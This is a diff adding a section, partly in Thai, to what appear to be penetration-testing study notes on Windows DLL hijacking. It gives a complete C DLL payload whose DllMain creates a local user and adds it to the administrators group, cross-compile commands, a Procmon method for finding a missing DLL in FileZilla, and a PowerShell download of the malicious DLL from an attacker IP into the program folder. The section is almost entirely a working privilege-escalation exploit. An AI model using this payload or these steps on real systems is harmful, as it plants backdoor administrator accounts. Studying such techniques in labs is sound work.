@@ -193,3 +193,55 @@ Get-ModifiableServiceFile
 ```
 
 ![[Powerup-1.png]]![[PowerUp-2.png]]
+
+
+[[WinDLLHijacking]]
+
+```c
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+```
+# เตรียม DLL สำหรับ Hijack 
+sudo apt update
+sudo apt install g++-mingw-w64 
+
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+
+```
+
+ภายใต้ Procmon เราจะ Filter Service ที่สนใจ ในที่นี้เป็น Filezilla.exe และทำการตรวจหา DLL ที่ขึ้นผลลัพธ์เป็น NAME NOT FOUND 
+![[windllinjectwithprocmon.png]]
+
+ช่องโหว่ของ FileZilla version ที่ใช้ มีช่องโหว่บน DLL ดังตัวอย่าง
+
+```
+C:\FileZilla\FileZilla FTP Client\TextShaping.dll 
+```
+
+```
+iwr -uri http://192.168.45.241/dllhij.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+```
